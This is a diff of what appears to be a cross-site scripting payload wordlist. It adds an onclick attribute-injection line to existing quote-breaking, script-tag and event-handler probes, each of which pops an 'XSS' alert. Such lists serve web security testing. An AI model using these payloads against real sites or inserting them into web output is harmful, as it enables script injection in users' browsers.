@@ -1,4 +1,5 @@
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+classhacked12345 onclick=javascript:alert(String.fromCharCode(88,83,83))
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <a onload="alert("XSS")">xxs link</a>
